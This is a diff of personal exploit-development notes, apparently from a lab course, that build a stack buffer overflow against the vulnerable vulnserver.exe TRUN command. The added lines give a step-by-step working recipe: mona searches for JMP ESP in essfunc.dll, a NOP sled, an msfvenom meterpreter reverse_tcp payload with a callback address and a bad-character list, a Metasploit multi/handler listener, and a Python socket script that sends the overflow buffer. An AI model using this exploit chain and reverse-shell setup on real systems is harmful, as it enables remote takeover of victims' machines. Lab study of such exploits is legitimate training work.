@@ -210,7 +210,7 @@ print(offset)
 # Back in GDB, run <<<$(python ./lin.py)
 # Put register value in Wiremask to find Offset.
 # Use Wiremask to find EIP
-# Verify EIP by putting 4*"B"s
+# Verify EIP by putting 4 "B" at the end of offset ------> TRYING TO OVERWRITE EIP
 # Find the JMP ESP location
     #shell
     #env - gdb ./func
@@ -282,20 +282,43 @@ ADD ALL RESULTS TO SCIRPT AND PRINT STATEMENT
     nc <win ip> <port identified>  ----> (Ran from Lin-Ops and see what pops up)
 #Dynamic Analysis
     Run Immunity Debugger > Run vulnserver.exe > File > Attach | Rewind > Play
-    On Lin-Ops CREATE NEW SCRIPT 
-  1 #!/usr/bin/python
-  2 import socket 
-  3 buf = "HELP"
-  4 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  #Creates socket
-  5 s.connect(("10.50.171.24", 9999))   #Connecting to TargetIP/Port  ------> (your windows ip)
-  6 print s.recv(1024)  #Print response
-  7 s.send(buf)  #Sends value of buf
-  8 print s.recv(1024)  #Print response
-  9 s.close()  #Closes the socket
- 10
- 11
- 12
- 13 
+    On Lin-Ops CREATE NEW SCRIPT     RESTART AND RUN DEBUGGER AFTER EVERY VALUE ADDED
+    !mona modules ------> searching for unprotected dll's (which is the most vulnerable / False across the board)
+    !mona jmp -r esp -m "essfunc.dll" -----> searches for jmp esp in specific dll (Log data Window on Immunity Debugger)
+    COPY FIRST 2-3 & move to script (buf += "inverted\numbers")
+    Create NOP SLED (buf += "\x90" * 10)
+    CREATE PAYLOAD = msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.188.39 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python ----> (lhost is Lin-Ops IP)  RUN PAYLOAD IN TERMINAL
+    COPY AND PASTE PAYLOAD INTO SCRIPT 
+    SETUP MSFCONSOLE
+    msfconsole
+    use multi/handler
+    show options
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST 0.0.0.0
+    set LPORT 4444
+    exploit
+
+
+
+  #!/usr/bin/python
+  import socket 
+  buf = "TRUN /.:/"    #Commands accepted
+  buf += "A" * 2003
+  #JMP ESP:
+  buf += "\xaf\x11\x50\x62 -----------------> essentially inverted
+  #62 50 11 af
+  #PAYLOAD HERE#
+
+  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  #Creates socket
+  s.connect(("10.50.171.24", 9999))   #Connecting to TargetIP/Port  ------> (your windows ip)
+  print s.recv(1024)  #Print response
+  s.send(buf)  #Sends value of buf
+  print s.recv(1024)  #Print response
+  s.close()  #Closes the socket
+  
+ 
+ 
+  
 
 
 
